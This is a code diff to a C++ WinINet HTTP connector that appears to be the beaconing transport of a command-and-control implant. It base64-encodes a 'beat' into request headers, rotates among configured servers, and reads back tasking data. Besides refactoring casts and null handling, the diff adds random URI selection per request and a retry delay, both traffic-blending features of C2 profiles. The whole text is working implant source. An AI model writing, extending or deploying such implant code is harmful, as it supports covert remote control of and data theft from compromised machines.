@@ -9,7 +9,7 @@ BOOL _isdigest(char c)
 	return c >= '0' && c <= '9';
 }
 
-int _atoi(const char* str) 
+int _atoi(const char* str)
 {
 	int result = 0;
 	int sign = 1;
@@ -34,17 +34,17 @@ int _atoi(const char* str)
 	return result * sign;
 }
 
-DWORD _strlen(CHAR* str)
+DWORD _strlen(const CHAR* str)
 {
 	int i = 0;
-	if (str != NULL)
-		for (; str[i]; i++);
+	if (str != nullptr)
+		for (; str[i]; i++) {}
 	return i;
 }
 
 ConnectorHTTP::ConnectorHTTP()
 {
-	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC) );
+	this->functions = static_cast<HTTPFUNC*>(ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC)));
 	
 	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
 	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
@@ -81,7 +81,7 @@ ConnectorHTTP::ConnectorHTTP()
 	}
 }
 
-BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
+BOOL ConnectorHTTP::SetConfig(const ProfileHTTP& profile, const BYTE* beat, ULONG beatSize)
 {
 	LPSTR encBeat = b64_encode(beat, beatSize);
 
@@ -89,7 +89,7 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	ULONG param_length    = _strlen((CHAR*) profile.parameter);
 	ULONG headers_length  = _strlen((CHAR*) profile.http_headers);
 
-	CHAR* HttpHeaders = (CHAR*) this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
+	CHAR* HttpHeaders = static_cast<CHAR*>(this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5));
 	memcpy(HttpHeaders, profile.http_headers, headers_length);
 	ULONG index = headers_length;
 	memcpy(HttpHeaders + index, profile.parameter, param_length);
@@ -104,7 +104,7 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 
 	memset(encBeat, 0, enc_beat_length);
 	this->functions->LocalFree(encBeat);
-	encBeat = NULL;
+	encBeat = nullptr;
 
 	this->headers        = HttpHeaders;
 	this->server_count   = profile.servers_count;
@@ -112,7 +112,7 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->server_ports   = profile.ports;
 	this->ssl            = profile.use_ssl;
 	this->http_method    = (CHAR*) profile.http_method;
-	this->uri            = (CHAR*) profile.uri;
+	this->uris            = (CHAR**) profile.uris;
 	this->user_agent     = (CHAR*) profile.user_agent;
 	this->ans_size		 = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
@@ -123,7 +123,7 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 {
 	this->recvSize = 0;
-	this->recvData = 0;
+	this->recvData = nullptr;
 
 	ULONG attempt   = 0;
 	BOOL  connected = FALSE;
@@ -131,24 +131,28 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 	DWORD context   = 0;
 
 	while ( !connected && attempt < this->server_count) {
-		DWORD dwError = 0;
-
 		if (!this->hInternet)
-			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0 );
+			this->hInternet = this->functions->InternetOpenA( this->user_agent, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0 );
 		if ( this->hInternet ) {
+			DWORD dwError = 0;
 
 			if ( !this->hConnect )
-				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
+				this->hConnect = this->functions->InternetConnectA( this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context );
 
 			if ( this->hConnect )
 			{
 				CHAR acceptTypes[] = { '*', '/', '*', 0 };
-				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
+				LPCSTR rgpszAcceptTypes[] = { acceptTypes, nullptr };
 				DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
 				if (this->ssl)
 					flags |= INTERNET_FLAG_SECURE;
 
-				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
+				// Choose a random URI to use for request
+				srand(time(nullptr));
+				size_t idx = rand() % this->uri_count;
+				CHAR* uri = this->uris[idx];
+
+				HINTERNET hRequest = this->functions->HttpOpenRequestA( this->hConnect, this->http_method, uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context );
 				if (hRequest) {
 					if (this->ssl) {
 						DWORD dwFlags;
@@ -160,29 +164,29 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						}
 					}
 
-					connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)data, (DWORD)data_size);
+					connected = this->functions->HttpSendRequestA(hRequest, this->headers, static_cast<DWORD>(_strlen(headers)), static_cast<LPVOID>(data), static_cast<DWORD>(data_size));
 					if (connected) {
 						char statusCode[255];
 						DWORD statusCodeLenght = 255;
-						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
+						BOOL httpResult = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
 
-						if (result && _atoi(statusCode) == 200) {
+						if (httpResult && _atoi(statusCode) == 200) {
 							DWORD answerSize = 0;
 							DWORD dwLengthDataSize = sizeof(DWORD);
-							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
+							httpResult = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, nullptr);
 
-							if (result) {
+							if (httpResult) {
 								DWORD dwNumberOfBytesAvailable = 0;
-								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
+								httpResult = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
 
-								if (result && answerSize > 0) {
+								if (httpResult && answerSize > 0) {
 									ULONG numberReadedBytes = 0;
 									DWORD readedBytes = 0;
-									BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);
+									BYTE* buffer = static_cast<BYTE*>(this->functions->LocalAlloc(LPTR, answerSize));
 
 									while (numberReadedBytes < answerSize) {
-										result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
-										if (!result || !readedBytes) {
+										httpResult = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
+										if (!httpResult || !readedBytes) {
 											break;
 										}
 										numberReadedBytes += readedBytes;
@@ -194,17 +198,17 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
 								ULONG numberReadedBytes = 0;
 								DWORD readedBytes = 0;
-								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, 0);
+								BYTE* buffer = static_cast<BYTE*>(this->functions->LocalAlloc(LPTR, 0));
 								DWORD dwNumberOfBytesAvailable = 0;
 
-								while (1) {
-									result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
-									if (!result || !dwNumberOfBytesAvailable)
+								while (true) {
+									httpResult = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
+									if (!httpResult || !dwNumberOfBytesAvailable)
 										break;
 
-									buffer = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
-									result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
-									if (!result || !readedBytes) {
+									buffer = static_cast<BYTE*>(this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE));
+									httpResult = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
+									if (!httpResult || !readedBytes) {
 										break;
 									}
 									numberReadedBytes += readedBytes;
@@ -232,32 +236,33 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 				if ( dwError == ERROR_INTERNET_CANNOT_CONNECT || dwError == ERROR_INTERNET_TIMEOUT ) {
 					if (this->hConnect) {
 						this->functions->InternetCloseHandle(this->hConnect);
-						this->hConnect = NULL;
+						this->hConnect = nullptr;
 					}
 					if (this->hInternet) {
 						this->functions->InternetCloseHandle(this->hInternet);
-						this->hInternet = NULL;
+						this->hInternet = nullptr;
 					}
 
-					this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
-					this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
+					this->functions->InternetSetOptionA(nullptr, INTERNET_OPTION_SETTINGS_CHANGED, nullptr, 0);
+					this->functions->InternetSetOptionA(nullptr, INTERNET_OPTION_REFRESH, nullptr, 0);
 				}
 
 				this->server_index = (this->server_index + 1) % this->server_count;
+				Sleep(5000);
 			}
 		}
 	}
 }
 
-BYTE* ConnectorHTTP::RecvData()
+BYTE* ConnectorHTTP::RecvData() const
 {
 	if (this->recvData)
 		return this->recvData + this->ans_pre_size;
 	else
-		return NULL;
+		return nullptr;
 }
 
-int ConnectorHTTP::RecvSize()
+int ConnectorHTTP::RecvSize() const
 {
 	if (this->recvSize < this->ans_size)
 		return 0;
@@ -270,7 +275,7 @@ void ConnectorHTTP::RecvClear()
 	if (this->recvData && this->recvSize) {
 		memset(this->recvData, 0, this->recvSize);
 		this->functions->LocalFree(this->recvData);
-		this->recvData = NULL;
+		this->recvData = nullptr;
 	}
 }
 
@@ -279,7 +284,7 @@ void ConnectorHTTP::CloseConnector()
 	DWORD l = _strlen(this->headers);
 	memset(this->headers, 0, l);
 	this->functions->LocalFree(this->headers);
-	this->headers = NULL;
+	this->headers = nullptr;
 
 	this->functions->InternetCloseHandle(this->hInternet);
 	this->functions->InternetCloseHandle(this->hConnect);
